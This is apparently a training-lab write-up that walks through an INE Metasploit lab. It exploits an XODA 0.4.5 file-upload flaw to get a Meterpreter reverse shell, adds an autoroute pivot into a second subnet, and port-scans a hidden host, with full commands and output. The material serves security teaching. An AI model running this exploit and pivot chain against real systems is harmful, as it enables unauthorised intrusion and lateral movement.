#### 1. T1046 : Network Service Scanning


### Objective
Identify the ports open on the second target machine using appropriate Metasploit modules

### Skills Learned
- Enumeration 

### Tools Used

- Metasploit
-Bash
-Terminal
-Nmap

### Steps

The lab environment and objective are described in the "Tasks" tab
<img width="1918" height="999" alt="Screenshot 2025-08-22 at 6 38 45 PM" src="https://github.com/user-attachments/assets/fe7f9827-b329-4778-bb53-b04b71a1fed6" />

First, let's ping the objective
```
┌──(root㉿INE)-[~]
└─# ping demo1.ine.local
PING demo1.ine.local (192.70.151.3) 56(84) bytes of data.
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=1 ttl=64 time=0.145 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=4 ttl=64 time=0.055 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=5 ttl=64 time=0.060 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=6 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=7 ttl=64 time=0.048 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=8 ttl=64 time=0.071 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=9 ttl=64 time=0.055 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=10 ttl=64 time=0.056 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=11 ttl=64 time=0.054 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=12 ttl=64 time=0.048 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=13 ttl=64 time=0.053 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=14 ttl=64 time=0.053 ms
64 bytes from demo1.ine.local (192.70.151.3): icmp_seq=15 ttl=64 time=0.054 ms
^C
--- demo1.ine.local ping statistics ---
15 packets transmitted, 15 received, 0% packet loss, time 14361ms
rtt min/avg/max/mdev = 0.048/0.061/0.145/0.022 ms

```
Then, run nmap over the target 

```
┌──(root㉿INE)-[~]
└─# nmap -Pn -sV demo1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 04:51 IST
Nmap scan report for demo1.ine.local (192.70.151.3)
Host is up (0.000022s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:42:C0:46:97:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds

```
And we can see that the port 80 is open and runs a http service. Now open msfconsole

Since we know there's a vulnerability associated to XODA, search for the exploit.

```
msf6 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

```
Select the exploit:

```
msf6 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

```
Now let's see the configuration options, with the show options command

```
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.


```

now, set the parameters

```
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
RHOSTS => demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     demo1.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.

```
run the exploit command, but got an error cause the LHOST parameter was not set.

```

msf6 exploit(unix/webapp/xoda_file_upload) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending PHP payload (TGQHtyJaURILI.php)
[*] Executing PHP payload (TGQHtyJaURILI.php)
[*] Exploit completed, but no session was created.

```
Change the parameter and run the exploit:

```
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.70.151.2 
LHOST => 192.70.151.2
msf6 exploit(unix/webapp/xoda_file_upload) > exploit

[*] Started reverse TCP handler on 192.70.151.2:4444 
[*] Sending PHP payload (FjuRXO.php)
[*] Executing PHP payload (FjuRXO.php)
[*] Sending stage (39927 bytes) to 192.70.151.3
[!] Deleting FjuRXO.php
[*] Meterpreter session 1 opened (192.70.151.2:4444 -> 192.70.151.3:52870) at 2025-08-25 05:08:32 +0530

```

Now we have a Mertepreter session. Since you have this session, you can get the information of the target machine with the sysinfo command: 

```
meterpreter > sysinfo
Computer    : demo1.ine.local
OS          : Linux demo1.ine.local 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64
Meterpreter : php/linux
meterpreter > 

```
We have to look for the information of the second target, becuase we got the information of the known one
For that, open a shell session and for better understanding you can change it to bash 

```
meterpreter > shell 
Process 801 created.
Channel 0 created.
/bin/bash -i
bash: cannot set terminal process group (433): Inappropriate ioctl for device
bash: no job control in this shell
www-data@demo1:/app/files$ 

```
With ifconfig command you cna get the related network information

```
www-data@demo1:/app/files$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:c0:46:97:03  
          inet addr:192.70.151.3  Bcast:192.70.151.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1171 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1127 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:169925 (169.9 KB)  TX bytes:77138 (77.1 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:1c:8a:02  
          inet addr:192.28.138.2  Bcast:192.28.138.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1602 (1.6 KB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:300 (300.0 B)  TX bytes:300 (300.0 B)

www-data@demo1:/app/files$ 

```
eth0 is the ip of the known device and eth1 is the address of the other subnet where the second machine is located.
Add the route to meterpreter 

```
meterpreter > run autoroute -s 192.28.138.2

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.28.138.2/255.255.255.0...
[+] Added route to 192.28.138.2/255.255.255.0 via 192.70.151.3
[*] Use the -p option to list all active routes

```
Now use portscan exploit and set the parameters 

```
msf6 exploit(unix/webapp/xoda_file_upload) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(unix/webapp/xoda_file_upload) > use 5
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.28.138.3
RHOSTS => 192.28.138.3

```
and you'll see the 3 services running, therefore you can answer the question
<img width="1915" height="969" alt="Screenshot 2025-08-24 at 7 16 13 PM" src="https://github.com/user-attachments/assets/fe9bdef6-43b5-4c83-b6c2-74dc2ef3f384" />

